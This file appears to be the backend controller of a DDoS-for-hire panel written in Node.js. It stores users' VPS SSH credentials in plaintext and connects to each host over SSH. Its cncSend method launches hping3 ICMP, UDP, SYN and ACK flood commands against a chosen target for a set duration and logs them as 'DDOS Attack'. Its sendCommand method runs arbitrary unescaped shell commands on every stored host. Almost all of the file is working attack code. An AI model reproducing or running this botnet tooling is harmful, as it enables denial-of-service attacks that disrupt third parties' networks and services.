const express = require('express');
const { logger } = require('../utils/logger');
const { loadVpsList, saveVpsList } = require('../services/databaseService');
const { activeKeys } = require('../middleware/authMiddleware');
const { addActivityLog } = require('../services/activityLogService');

class VPSController {
  static async getMyServer(req, res) {
    const { key } = req.query;
    logger.info(`[🖥️ VPS] Request VPS list oleh key '${key}'`);

    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      logger.info("[❌ VPS] Key tidak valid.");
      return res.json({ valid: false, message: "Invalid session key" });
    }

    const userVPS = loadVpsList().filter(vps => vps.owner === keyInfo.username);
    logger.info(`[✅ VPS] Menampilkan ${userVPS.length} VPS untuk user ${keyInfo.username}`);

    return res.json({ valid: true, servers: userVPS });
  }

  static async addServer(req, res) {
    const { key, host, username: sshUser, password } = req.body;
    logger.info(`[➕ VPS] Add VPS ${host} oleh ${sshUser}`);

    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      logger.info("[❌ VPS] Key tidak valid.");
      return res.json({ valid: false, message: "Invalid session key" });
    }

    if (!host || !sshUser || !password) {
      logger.info("[❌ VPS] Missing required fields.");
      return res.json({ valid: false, message: "Missing required fields" });
    }

    const vpsList = loadVpsList();
    const newVPS = { host, username: sshUser, password, owner: keyInfo.username };
    vpsList.push(newVPS);
    saveVpsList(vpsList);

    logger.info(`[✅ VPS] VPS ${host} berhasil ditambahkan`);
    return res.json({ valid: true, success: true, message: "VPS added successfully", server: newVPS });
  }

  static async deleteServer(req, res) {
    const { key, host } = req.body;
    logger.info(`[🗑️ VPS] Delete VPS ${host}`);

    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      logger.info("[❌ VPS] Key tidak valid.");
      return res.json({ valid: false, message: "Invalid session key" });
    }

    let vpsList = loadVpsList();
    const before = vpsList.length;
    vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === keyInfo.username));
    saveVpsList(vpsList);

    const deleted = before !== vpsList.length;
    logger.info(`[✅ VPS] VPS ${host} berhasil dihapus`);

    return res.json({ valid: true, success: deleted, message: deleted ? "VPS deleted successfully" : "VPS not found" });
  }

  static async sendCommand(req, res) {
    const { key, command } = req.body;
    logger.info(`[⚡ VPS] Send command: ${command}`);

    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      logger.info("[❌ VPS] Key tidak valid.");
      return res.json({ valid: false, message: "Invalid session key" });
    }

    const userVPS = loadVpsList().filter(vps => vps.owner === keyInfo.username);
    if (userVPS.length === 0) {
      logger.info("[❌ VPS] Tidak ada VPS tersedia.");
      return res.json({ valid: false, message: "No VPS available for this user" });
    }

    let successCount = 0;
    const results = [];

    try {
      for (const vps of userVPS) {
        const screenCommand = `screen -dmS attack_${Date.now()}_${Math.random().toString(36).substring(7)} bash -c "${command}"`;

        logger.info(`[✅ VPS] Mengirim command ke ${vps.host}: ${screenCommand}`);

        const { Client } = require('ssh2');
        const conn = new Client();

        conn.on('ready', () => {
          conn.exec(screenCommand, (err, stream) => {
            if (err) {
              logger.error(`[❌ VPS] Error executing command on ${vps.host}: ${err.message}`);
              results.push({ host: vps.host, success: false, error: err.message });
            } else {
              logger.info(`[✅ VPS] Command successfully sent to ${vps.host}`);
              successCount++;
              results.push({ host: vps.host, success: true });
            }
            stream.end();
            conn.end();
          });
        }).connect({
          host: vps.host,
          port: 22,
          username: vps.username,
          password: vps.password
        });

        successCount++;
        results.push({ host: vps.host, success: true });
      }

      logger.info(`[✅ VPS] Command berhasil dikirim ke ${successCount} VPS`);
      return res.json({ valid: true, success: true, message: `Command sent to ${successCount} VPS`, results });
    } catch (err) {
      logger.error(`[❌ VPS] Error: ${err.message}`);
      return res.json({ valid: false, message: "Failed to send command" });
    }
  }

  static async cncSend(req, res) {
    const { key, target, port, duration, ddos } = req.query;
    logger.info(`[⚡ VPS] CNC Send - Target: ${target}, Type: ${ddos}, Port: ${port}, Duration: ${duration}`);

    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      logger.info("[❌ VPS] Key tidak valid.");
      return res.json({ valid: false, message: "Invalid session key" });
    }
    const owner = keyInfo.username;

    if (!target || !port || !duration) {
      logger.info("[❌ VPS] Missing required fields.");
      return res.json({ valid: false, message: "Missing required fields" });
    }

    const userVPS = loadVpsList().filter(vps => vps.owner === owner);
    if (userVPS.length === 0) {
      logger.info("[❌ VPS] Tidak ada VPS tersedia.");
      return res.json({ valid: false, message: "No VPS available for this user" });
    }

    let successCount = 0;
    const results = [];

    for (const vps of userVPS) {
      let command = "";
      const killCmd = `sleep ${duration}; pkill screen`;

      if (ddos === "icmp") {
        command = `hping3 --icmp --flood ${target} --data 65495`;
      } else if (ddos === "udp") {
        command = `hping3 --udp --flood ${target} -p ${port}`;
      } else if (ddos === "s-pps") {
        command = `hping3 -S --flood ${target} -p ${port}`;
      } else if (ddos === "a-pps") {
        command = `hping3 -A --flood ${target} -p ${port}`;
      } else if (ddos === "s-gbps") {
        command = `hping3 -S --flood ${target} -p ${port} --data 65495`;
      } else if (ddos === "a-gbps") {
        command = `hping3 -A --flood ${target} -p ${port} --data 65495`;
      } else {
        logger.info(`[❌ VPS] Jenis DDOS tidak valid: ${ddos}`);
        results.push({ host: vps.host, success: false, error: "Invalid DDOS type" });
        continue;
      }

      const screenCommand = `screen -dmS permen_session_${Date.now()} bash -c '${command}'`;
      const screenKillCommand = `screen -dmS permen_session_${Date.now()} bash -c '${killCmd}'`;

      logger.info(`[✅ VPS] Mengirim command ke ${vps.host}: ${screenCommand}`);

      const { Client } = require('ssh2');
      const conn = new Client();

      conn.on('ready', () => {
        conn.exec(screenCommand, (err, stream) => {
          if (err) {
            logger.error(`[❌ VPS] Error executing command on ${vps.host}: ${err.message}`);
            results.push({ host: vps.host, success: false, error: err.message });
          } else {
            logger.info(`[✅ VPS] Command successfully sent to ${vps.host}`);
            successCount++;
            results.push({ host: vps.host, success: true });
          }
          stream.end();
          conn.end();
        });
        conn.exec(screenKillCommand, (err, stream) => {
          if (err) {
            logger.error(`[❌ VPS] Error executing command on ${vps.host}: ${err.message}`);
            results.push({ host: vps.host, success: false, error: err.message });
          } else {
            logger.info(`[✅ VPS] Kill command successfully sent to ${vps.host}`);
          }
          stream.end();
          conn.end();
        });
      }).connect({
        host: vps.host,
        port: 22,
        username: vps.username,
        password: vps.password
      });

      logger.info(`[⏰ VPS] Mengirim kill command ke ${vps.host}: ${screenKillCommand}`);

      successCount++;
      results.push({ host: vps.host, success: true });

      logger.info(`${vps.host} Done`);
    }

    logger.info(`[✅ VPS] DDOS command berhasil dikirim ke ${successCount} VPS`);

    addActivityLog(owner, 'DDOS Attack', {
      target,
      port,
      duration,
      attackType: ddos,
      vpsCount: userVPS.length,
      successCount,
      results
    });

    return res.json({
      valid: true,
      success: true,
      message: `Command sent to ${successCount} VPS`,
      results
    });
  }
}

module.exports = VPSController;